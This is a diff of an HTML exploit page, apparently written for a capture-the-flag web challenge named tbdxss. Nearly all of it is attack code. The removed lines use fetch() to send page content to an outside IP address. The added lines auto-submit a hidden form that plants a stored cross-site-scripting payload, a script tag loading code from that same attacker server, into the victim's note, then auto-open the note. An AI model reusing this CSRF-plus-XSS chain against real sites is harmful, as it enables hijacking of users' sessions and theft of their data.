@@ -1,16 +1,13 @@
 
 <html>
 		<body>
-				<iframe src=https://tbdxss.chal.perfect.blue/note id="hello">
-				
-
-				</iframe>
+				<form action="https://tbdxss.chal.perfect.blue/change_note" method="POST" id="test">
+					<input type="hidden" name="data" value="<script src=http://206.189.15.196:1234></script>">
+				</form>
+				<a href="https://tbdxss.chal.perfect.blue/note" id="zebi"> zebi </a>
 		</body>
-		
 		<script>
-			var iframe = document.getElementById("hello");
-			var iframeContent = iframe.contentWindow.document;
-			var flag = document.body;
-			fetch("http://206.189.15.196:1234/"+flag)
+				document.getElementById("test").submit();
+				document.getElementById("zebi").click();
 		</script>
 </html>
